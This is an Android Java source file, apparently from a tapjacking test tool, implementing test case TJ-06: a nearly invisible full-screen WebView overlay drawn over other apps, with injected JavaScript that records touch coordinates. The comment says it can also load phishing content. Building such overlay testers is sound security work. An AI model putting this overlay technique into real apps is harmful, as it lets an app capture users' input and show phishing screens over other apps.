package com.mobiscan.tapjacktester;

import android.app.Activity;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

/**
 * WebView Overlay for TJ-06 - injects transparent WebView over target.
 * Can execute JavaScript, intercept touch events, and load phishing content.
 */
public class WebViewOverlayActivity extends Activity {

    private WindowManager windowManager;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);

        try {
            // Create transparent WebView
            WebView webView = new WebView(this);
            WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);

            webView.setWebViewClient(new WebViewClient());
            webView.setBackgroundColor(0x01000000); // Nearly transparent

            // Execute JavaScript to monitor touch events
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    // Inject touch monitoring JavaScript
                    String js = "javascript:" +
                            "document.addEventListener('touchstart', function(e) {" +
                            "  var touch = e.touches[0];" +
                            "  console.log('[TAPJACKER] Touch at: ' + touch.clientX + ',' + touch.clientY);" +
                            "  document.title = 'TOUCH:' + touch.clientX + ',' + touch.clientY;" +
                            "}, {passive: false});" +
                            "document.addEventListener('touchmove', function(e) {" +
                            "  var touch = e.touches[0];" +
                            "  console.log('[TAPJACKER] Move: ' + touch.clientX + ',' + touch.clientY);" +
                            "}, {passive: false});";
                    view.evaluateJavascript(js, null);
                }
            });

            // Load a transparent page
            webView.loadDataWithBaseURL("https://localhost",
                    "<html><body style='background:transparent;margin:0;'>" +
                            "<div style='width:100vw;height:100vh;'>" +
                            "<script>" +
                            "var touchData = [];" +
                            "document.addEventListener('touchstart', function(e) {" +
                            "  var t = e.touches[0];" +
                            "  touchData.push({x: t.clientX, y: t.clientY, time: Date.now()});" +
                            "  document.title = 'CAPTURED:' + touchData.length;" +
                            "}, false);" +
                            "</script>" +
                            "</div></body></html>",
                    "text/html", "UTF-8", null);

            // Overlay parameters
            int type;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
            } else {
                @SuppressWarnings("deprecation")
                int t = WindowManager.LayoutParams.TYPE_PHONE;
                type = t;
            }

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT
            );
            params.gravity = Gravity.TOP | Gravity.START;

            params.alpha = 0.05f; // Nearly invisible

            windowManager.addView(webView, params);

            // Auto-close after 5 seconds
            handler.postDelayed(() -> {
                try {
                    windowManager.removeView(webView);
                } catch (Exception ignored) {}
                finish();
            }, 5000);

        } catch (Exception e) {
            finish();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacksAndMessages(null);
    }
}
